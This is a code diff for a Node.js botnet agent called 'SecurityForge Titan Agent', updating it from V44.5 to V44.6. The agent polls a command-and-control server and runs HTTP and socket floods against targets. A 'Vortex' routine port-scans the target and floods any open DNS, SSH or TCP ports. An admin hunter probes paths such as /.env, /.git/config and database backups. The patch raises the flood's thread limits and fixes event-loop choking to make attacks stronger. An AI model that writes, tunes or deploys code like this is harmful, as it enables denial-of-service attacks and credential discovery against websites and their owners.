@@ -1,11 +1,11 @@
 /**
- * SECURITYFORGE TITAN AGENT V44.5 (PHANTOM SLAYER)
+ * SECURITYFORGE TITAN AGENT V44.6 (STABLE CORE)
  * 
  * [PATCH LOG]
- * - FIXED: Infinite Robots.txt Loop
- * - FEATURE: Smart 404 "Ghost" Calibration (Filters fake 200 OKs)
- * - FEATURE: Static vs Mutation Path Logic (Finds /cpanel correctly)
- * - FEATURE: 100% Death Fallback System
+ * - FIXED: Event Loop Choking (1 Thread = 1 Request Stream)
+ * - FIXED: Startup CPU Spike (Added Stagger)
+ * - FEATURE: True 100% Death (IP Resolve -> Port Scan -> Attack)
+ * - FEATURE: Log Deduping (No more duplicate "Found" messages)
  */
 
 const https = require('https');
@@ -79,14 +79,12 @@ const BUFFERS = {
     JUNK: Buffer.allocUnsafe(1400).fill('X')
 };
 
-// PATHS THAT SHOULD NOT HAVE EXTENSIONS ADDED
 const STATIC_PATHS = [
     '/admin', '/cpanel', '/whm', '/webmail', '/dashboard', '/wp-admin', 
     '/login', '/user', '/auth', '/backup', '/db', '/phpmyadmin', 
     '/server-status', '/robots.txt', '/sitemap.xml', '/.env', '/.git/config'
 ];
 
-// PATHS TO MUTATE (ADD .php, .html, etc)
 const MUTATION_BASES = [
     '/config', '/db_connect', '/settings', '/setup', '/install', '/update',
     '/backup', '/dump', '/users', '/clients', '/orders', '/api', '/upload',
@@ -99,16 +97,18 @@ const EXTENSIONS = ['.php', '.html', '.json', '.xml', '.sql', '.zip', '.bak', '.
 // 2. UTILITIES
 // ==========================================
 const log = (msg, type = 'INFO') => {
-    // Dedup Logs locally before sending
     const entry = `[${type}] ${msg}`;
     console.log(entry);
+    
+    // STRICT DEDUPING
     if (type === 'SUCCESS' || type === 'FOUND' || type === 'OPEN' || type === 'ERROR') {
         if (!STATE.discovered.has(entry)) {
             STATE.priorityLogs.push(entry);
             STATE.discovered.add(entry);
         }
     } else {
-        STATE.logs.push(entry);
+        // Limit general logs to avoid buffer bloat
+        if (STATE.logs.length < 20) STATE.logs.push(entry);
     }
 };
 
@@ -242,11 +242,9 @@ const runAdminHunter = (target) => {
     if (!STATE.running) return;
     const lib = target.isSsl ? https : http;
 
-    // Generator for all paths
     const pathGenerator = function* () {
         // 1. Check Static High-Value Paths FIRST
         for (const p of STATIC_PATHS) yield p;
-        
         // 2. Check Mutated Paths
         for (const base of MUTATION_BASES) {
             for (const ext of EXTENSIONS) {
@@ -260,10 +258,10 @@ const runAdminHunter = (target) => {
     const crawl = () => {
         if (!STATE.running) return;
 
-        // Run 5 concurrent checks
+        // Run 5 concurrent checks (Low concurrency to allow Flood threads to dominate)
         for (let i = 0; i < 5; i++) {
             const next = iterator.next();
-            if (next.done) return; // Done with list
+            if (next.done) return; 
 
             const path = next.value;
             const fullUrl = `${target.isSsl?'https':'http'}://${target.host}${path}`;
@@ -319,7 +317,9 @@ const runVortex = (job, target) => {
                     // Attack Open Port
                     const attackType = (port === 53) ? 'DNS' : (port === 22) ? 'SSH' : 'TCP';
                     log(`VORTEX: Attacking Port ${port} (${attackType})...`, 'warning');
-                    for(let k=0; k<50; k++) runSocketStress(job, target, attackType, port);
+                    
+                    // Moderate socket flood on open ports
+                    for(let k=0; k<10; k++) runSocketStress(job, target, attackType, port);
 
                     s.destroy();
                 });
@@ -330,13 +330,21 @@ const runVortex = (job, target) => {
             setTimeout(() => {
                 if (openPortsFound === 0) {
                     log('VORTEX: No open ports confirmed (Stealth/Firewall). Engaging HTTP Flood on Domain.', 'warning');
-                    for(let i=0; i<100; i++) runHttpFlood(job, target);
+                    // Launch standard flood as fallback
+                    const threads = Math.min(job.concurrency || 50, 500);
+                    for(let i=0; i<threads; i++) {
+                         setTimeout(() => runHttpFlood(job, target), i * 10);
+                    }
                 }
             }, 5000);
 
         } else {
             log('VORTEX: DNS Failed. Attacking Domain directly.', 'ERROR');
-            for(let i=0; i<100; i++) runHttpFlood(job, target);
+            // DNS Fallback
+            const threads = Math.min(job.concurrency || 50, 500);
+            for(let i=0; i<threads; i++) {
+                 setTimeout(() => runHttpFlood(job, target), i * 10);
+            }
         }
     });
 };
@@ -359,8 +367,8 @@ const runSocketStress = (job, target, type, portOverride = null) => {
         if (STATE.running) setImmediate(attack);
     };
     
-    // Launch 5 streams per call
-    for(let i=0; i<5; i++) attack();
+    // Single stream per call to prevent choke
+    attack();
 };
 
 const runHttpFlood = (job, target) => {
@@ -390,16 +398,19 @@ const runHttpFlood = (job, target) => {
             if (STATE.running) setImmediate(attack);
         });
         req.on('error', () => STATE.stats.failed++);
+        if (job.method === 'POST') req.write(job.body || '{}');
         req.end();
     };
-    for(let i=0; i<5; i++) attack();
+    
+    // CRITICAL FIX: 1 Thread = 1 Connection Loop. 
+    // Do not launch multiple attacks() per thread, or it chokes the event loop.
+    attack();
 };
 
 // ==========================================
 // 4. MAIN JOB CONTROL
 // ==========================================
 const startJob = async (job) => {
-    // Prevent duplicate start for same job
     if (STATE.running && STATE.activeJob?.id === job.id) return;
     
     STATE.activeJob = job;
@@ -408,7 +419,7 @@ const startJob = async (job) => {
     STATE.discovered.clear();
     STATE.dynamicPaths = [];
     
-    log(`TITAN V44.5 | TARGET: ${job.target}`);
+    log(`TITAN V44.6 | TARGET: ${job.target}`);
     const target = getTargetDetails(job.target);
     if (!target) return;
 
@@ -419,19 +430,26 @@ const startJob = async (job) => {
 
     if (job.use_100_percent_death) {
         log('WARNING: 100% DEATH MODE. FULL ASSAULT.', 'warning');
-        runVortex(job, target); // IP + Port Scan
+        runVortex(job, target); // IP + Port Scan -> Auto Attack
         runSpider(target);
         runAdminHunter(target);
+        // Vortex handles the main attack threads after scan
     } else {
         if (job.use_admin_hunter) {
             runSpider(target);
             runAdminHunter(target);
         }
+        
+        // STANDARD MODE LAUNCHER
+        // CRITICAL FIX: Stagger thread startup to prevent CPU freeze on cheap nodes
+        const threads = Math.min(job.concurrency || 50, 1000); // Increased limit, but throttled start
+        log(`STARTING ${threads} ATTACK THREADS...`);
+        
+        for(let i=0; i<threads; i++) {
+            // Stagger 10ms between threads
+            setTimeout(() => runHttpFlood(job, target), i * 10);
+        }
     }
-    
-    // Standard Flood
-    const threads = Math.min(job.concurrency || 50, 200);
-    for(let i=0; i<threads; i++) runHttpFlood(job, target);
 };
 
 const stopJob = () => {
@@ -449,7 +467,7 @@ setInterval(() => {
             node_id: NODE_ID,
             last_seen: new Date().toISOString(),
             ip: STATE.resolvedIp || 'unknown',
-            version: 'V44.5'
+            version: 'V44.6'
         }, { 'Prefer': 'resolution=merge-duplicates' }).catch(() => {});
         STATE.lastHeartbeat = now;
     }
@@ -496,5 +514,5 @@ setInterval(async () => {
     }
 }, C2_CONFIG.pollInterval);
 
-http.createServer((req, res) => res.end('Titan V44.5 Online')).listen(process.env.PORT || 3000);
-console.log('SecurityForge Titan Agent V44.5 (Phantom Slayer) Online | ID: ' + NODE_ID);
+http.createServer((req, res) => res.end('Titan V44.6 Online')).listen(process.env.PORT || 3000);
+console.log('SecurityForge Titan Agent V44.6 (Stable Core) Online | ID: ' + NODE_ID);
